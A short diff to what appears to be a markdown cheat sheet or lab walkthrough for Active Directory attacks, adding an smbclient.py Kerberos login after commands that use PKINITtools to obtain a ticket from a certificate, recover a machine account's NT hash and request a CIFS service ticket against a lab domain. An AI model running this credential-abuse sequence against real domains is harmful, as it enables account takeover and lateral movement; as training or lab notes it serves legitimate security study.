@@ -191,6 +191,8 @@ python3 PKINITtools/gettgtpkinit.py -cert-pfx UvWSLQEU.pfx -pfx-pass uq1SMyetoBS
 python3 PKINITtools/getnthash.py -key f1969ba89e75d5893b06b1bf946e08d336ca04d82152f69fa2882021ce214172 -dc-ip 192.168.210.10 zsm.local/ZPH-SVRMGMT1$ (Recover NT hash)
 
 getST.py -k -no-pass ZPH-SVRMGMT1\$@192.168.210.11 -spn CIFS/ZPH-SVRMGMT1.ZSM.LOCAL -debug -dc-ip 192.168.210.10 (Retrieve CIFS TGT ticket)
+
+smbclient.py -k -no-pass ZPH-SVRMGMT1.ZSM.LOCAL -debug
 ```
 
 **Additional Resources**
